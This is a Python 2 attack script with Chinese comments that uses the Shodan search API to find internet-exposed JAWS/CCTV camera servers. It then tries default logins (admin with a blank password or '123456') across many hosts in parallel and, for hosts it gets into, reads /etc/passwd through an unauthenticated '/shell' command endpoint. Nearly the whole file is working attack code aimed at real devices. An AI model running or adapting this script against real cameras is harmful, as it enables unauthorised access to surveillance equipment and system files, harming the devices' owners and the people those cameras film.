# coding:utf-8
'''
         使用shodan获取弱口令网络摄像头
        仅针对CCTV摄像头
    created by dream9
'''
import shodan
import requests
from functools import partial
from multiprocessing.dummy import Pool as ThreadPool

# SHODAN_KEY 
'''
    登录之后访问  https://account.shodan.io/ 即可看到  API Key
'''
SHODAN_KEY = ''
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'}
'''
    搜索关键字
'''
def getHost(api, keyword='JAWS'):
    try:
        results = api.search(keyword)  # 获取shodan的搜索结果
        return ['http://' + result['ip_str'] + ':' + str(result['port']) for result in results['matches']]
    except shodan.APIError, e:
        print e

'''
    尝试登录
'''
def login(host, user='admin', pwd=''):
    try:
        url = host + '/cgi-bin/gw.cgi?xml='
        data = '<juan ver="" squ="" dir="0"><rpermission usr="' + user + '" pwd="' + pwd + '"><config base=""/><playback base=""/></rpermission></juan>'
        result = requests.get(url + data, headers=headers, timeout=7)
        # 匹配登录成功的关键字
        if 'config' in result.content:
            print host + '/view2.html' + '\t' + pwd + '\t' + get_etc_passwd(host)
        else:
            return host
    except:
        pass
    
'''
    获取 /etc/passwd 内容
   不需要登录也可以拿到
'''
def get_etc_passwd(host):
    try:
        url = host + '/shell?cat /etc/passwd'
        res = requests.get(url, headers=headers, timeout=7)
        return res.content if "::" in res.content  else ''
    except:
        pass

if __name__ == '__main__':
    # 需要搜索的关键词 (或者"Server: JAWS/1.0")
    keyword = 'JAWS'
    api = shodan.Shodan(SHODAN_KEY)
    errHost = []
    print '[*] beginning......'
    pool = ThreadPool(20)
    errHost = pool.map(login, getHost(api))
    pool.close()
    pool.join()
    login = partial(login, pwd='123456')  # 偏函数
    # 尝试使用123456作为密码登录
    if errHost:
        pool = ThreadPool(20)
        pool.map(login, errHost)
        pool.close()
        pool.join()
    print '[*] over'
